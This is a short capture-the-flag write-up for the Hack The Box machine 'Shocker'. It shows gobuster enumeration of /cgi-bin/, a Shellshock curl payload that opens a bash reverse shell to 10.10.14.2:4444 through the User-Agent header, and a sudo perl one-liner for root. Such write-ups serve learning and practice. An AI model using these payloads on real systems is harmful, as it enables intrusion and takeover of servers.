---
title: "HTB: Shocker"
tags: [htb, linux, easy, shellshock, cgi]
date: 2024-01-01
description: Demonstrating the Shellshock vulnerability (CVE-2014-6271) on a web server running CGI scripts.
---

# Hack The Box: Shocker

**Difficulty**: Easy  
**OS**: Linux  

## Reconnaissance

### Directory Enumeration
Gobuster reveals a `/cgi-bin/` directory.
```bash
gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x sh,cgi,pl
```
- Found: `user.sh`.

## Exploitation: Shellshock
The server uses an old Bash version vulnerable to Shellshock (CVE-2014-6271).
- **Concept**: Environment variables defined with `() { :;};` are parsed incorrectly, allowing trailing commands to execute.
- **Attack**:
  ```bash
  curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.2/4444 0>&1" http://10.10.10.56/cgi-bin/user.sh
  ```

## Privilege Escalation
- `sudo -l` reveals the user can run `/usr/bin/perl` without a password.
- **Exploit**: `sudo perl -e 'exec "/bin/sh";'`
